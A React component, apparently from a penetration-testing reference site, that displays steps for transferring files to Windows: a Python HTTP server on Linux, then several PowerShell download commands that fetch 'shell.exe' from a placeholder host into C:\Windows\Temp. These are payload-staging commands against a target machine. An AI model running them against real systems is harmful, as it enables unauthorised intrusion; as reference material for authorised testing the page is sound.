import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_Powershell_Webrequest = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Linux
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'python3 -m http.server 8000'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2.1 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="pwoershell">
              {"Invoke-WebRequest -Uri 'http://{IP}:8000/shell.exe' -OutFile 'C:\\Windows\\Temp\\shell.exe'"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2.2 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="pwoershell">
              {"wget 'http://{IP}:8000/shell.exe'"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2.3 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="pwoershell">
              {"curl 'http://{IP}:8000/shell.exe' -o shell.exe"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2.4 - Windows
              </Typography>
              <SyntaxHighlighter className="syntax" language="pwoershell">
              {"iwr -Uri 'http://{IP}:8000/shell.exe' -OutFile 'C:\\Windows\\Temp\\shell.exe'"}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_Powershell_Webrequest;
  